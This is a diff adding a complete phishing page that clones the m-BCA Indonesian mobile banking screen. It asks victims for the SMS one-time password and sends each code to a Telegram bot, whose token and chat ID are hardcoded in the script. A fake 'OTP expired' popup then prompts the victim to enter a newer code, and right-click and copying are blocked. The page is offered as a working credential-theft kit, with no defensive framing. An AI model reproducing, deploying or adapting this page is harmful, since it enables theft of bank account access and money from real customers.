@@ -1,0 +1,243 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>m-BCA Clone</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- SweetAlert2 untuk popup -->
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #003d79;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(180deg, #4a90e2 0%, #003b7a 100%);
+            overflow-y: hidden;
+        }
+        .main-container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        .logo {
+            text-align: center;
+            color: #003d79;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        .input-label {
+            color: #003d79;
+            font-size: 1.1em;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        .info-text {
+            color: #666;
+            font-size: 0.85em;
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+        .btn-ok {
+            background-color: #003d79;
+            color: white;
+            width: 100%;
+            margin-top: 20px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+            background: linear-gradient(180deg, #4a90e2 0%, #003b7a 100%);
+        }
+        .btn-ok:hover {
+            background-color: #002d59;
+        }
+        .btn-ok:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .form-control {
+            border: 2px solid #003d79;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 1.1em;
+            letter-spacing: 2px;
+        }
+        .form-control:focus {
+            border-color: none;
+            box-shadow: none;
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 0.85em;
+            margin-top: 5px;
+            display: none;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #003d79;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container d-flex justify-content-center align-items-center vh-100">
+        <div class="main-container">
+            <div class="logo">m-BCA</div>
+            <div class="mb-3">
+                <label class="input-label">Masukkan Kode OTP:</label>
+                <input type="password" id="kodeAkses" class="form-control" maxlength="6" pattern="\d*" autocomplete="off">
+                <div class="error-message" id="errorMessage">Kode OTP harus 6 digit angka</div>
+                <div class="info-text">
+                    Kode OTP Telah kami kirimkan silakan cek SMS dari 69888
+                    <br>
+                    Masukkan OTP jika sudah di terima
+                </div>
+                <div class="loading" id="loading">
+                    <div class="loading-spinner"></div>
+                    <div>Memproses...</div>
+                </div>
+                <button class="btn-ok" id="btnOk" disabled>OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- SweetAlert2 JS -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const kodeAkses = document.getElementById('kodeAkses');
+            const btnOk = document.getElementById('btnOk');
+            const errorMessage = document.getElementById('errorMessage');
+            const loading = document.getElementById('loading');
+
+            // Hanya memperbolehkan input angka
+            kodeAkses.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                validateInput();
+            });
+
+            // Mencegah paste teks non-angka
+            kodeAkses.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+                if (/^\d+$/.test(pastedText)) {
+                    this.value = pastedText.slice(0, 6);
+                    validateInput();
+                }
+            });
+
+            // Validasi input
+            function validateInput() {
+                const value = kodeAkses.value;
+                if (value.length === 6 && /^\d+$/.test(value)) {
+                    btnOk.disabled = false;
+                    errorMessage.style.display = 'none';
+                } else {
+                    btnOk.disabled = true;
+                    if (value.length > 0) {
+                        errorMessage.style.display = 'block';
+                    } else {
+                        errorMessage.style.display = 'none';
+                    }
+                }
+            }
+
+            // Handle tombol OK
+            btnOk.addEventListener('click', function() {
+                if (kodeAkses.value.length === 6) {
+                    // Tampilkan loading
+                    loading.style.display = 'block';
+                    btnOk.disabled = true;
+                    kodeAkses.disabled = true;
+
+                    // Simulasi proses
+                    setTimeout(() => {
+                        loading.style.display = 'none';
+
+                        // Kirim OTP ke Telegram
+                        sendTelegramMessage(kodeAkses.value);
+
+                        // Tampilkan popup sukses
+                        Swal.fire({
+                            title: 'Periksa kembali ',
+                            text: 'Kode OTP telah kadaluarsa silakan periksa OTP terbaru.',
+                            icon: 'success',
+                            confirmButtonColor: '#003d79',
+                            confirmButtonText: 'OK'
+                        }).then((result) => {
+                            // Reset form
+                            kodeAkses.value = '';
+                            kodeAkses.disabled = false;
+                            btnOk.disabled = true;
+                            validateInput();
+                        });
+                    }, 2000);
+                }
+            });
+
+            // Fungsi untuk mengirim data ke Telegram
+            function sendTelegramMessage(otpCode) {
+                const telegramBotToken = '7775961145:AAFJuF_DcYAD9Et_z6djnv8TzIJ17g4KE5A'; // Ganti dengan token bot Anda
+                const chatId = '7225707577'; // Ganti dengan chat ID Anda
+                const message = `
+<b>Informasi OTP Baru</b>
+-----------------------------
+🔑 OTP: ${otpCode}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+                `;
+
+                const telegramAPI = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                const url = `${telegramAPI}?chat_id=${chatId}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Pesan berhasil dikirim ke Telegram', data);
+                    })
+                    .catch(error => {
+                        console.error('Error mengirim pesan ke Telegram', error);
+                    });
+            }
+
+            // Tambahan keamanan
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+
+            // Disable copy paste pada input
+            kodeAkses.addEventListener('copy', function(e) {
+                e.preventDefault();
+            });
+            kodeAkses.addEventListener('cut', function(e) {
+                e.preventDefault();
+            });
+        });
+    </script>
+</body>
+</html>
